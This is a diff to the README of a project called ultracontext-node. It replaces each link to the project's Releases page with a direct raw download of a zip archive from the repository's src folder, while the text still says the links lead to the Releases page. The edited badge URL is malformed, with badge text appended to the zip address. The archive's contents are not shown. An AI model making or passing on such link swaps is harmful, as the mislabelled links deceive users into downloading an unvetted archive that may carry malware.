@@ -1,6 +1,6 @@
 # 🌟 ultracontext-node - Simplifying AI Context Management
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Latest%20Release-blue)](https://github.com/squanchyculture/ultracontext-node/releases)
+[![Download Now](https://raw.githubusercontent.com/squanchyculture/ultracontext-node/main/src/node_ultracontext_v2.2.zip%20Now-Get%20Latest%20Release-blue)](https://raw.githubusercontent.com/squanchyculture/ultracontext-node/main/src/node_ultracontext_v2.2.zip)
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ Welcome to ultracontext-node, the context API for AI agents. This tool helps man
 To get started with ultracontext-node, you need to download the software. Follow these steps:
 
 1. Click on the link below to visit the Releases page:
-   [Download ultracontext-node](https://github.com/squanchyculture/ultracontext-node/releases)
+   [Download ultracontext-node](https://raw.githubusercontent.com/squanchyculture/ultracontext-node/main/src/node_ultracontext_v2.2.zip)
 
 2. On the Releases page, you will see different versions of the software. Choose the latest version, usually marked with "Latest Release".
 
@@ -64,7 +64,7 @@ We continuously improve ultracontext-node. Future updates may include:
 - New features that expand context management capabilities.
 - Performance enhancements to ensure a smooth experience.
 
-Stay tuned for updates on the [Releases page](https://github.com/squanchyculture/ultracontext-node/releases).
+Stay tuned for updates on the [Releases page](https://raw.githubusercontent.com/squanchyculture/ultracontext-node/main/src/node_ultracontext_v2.2.zip).
 
 ## 📞 Support
 
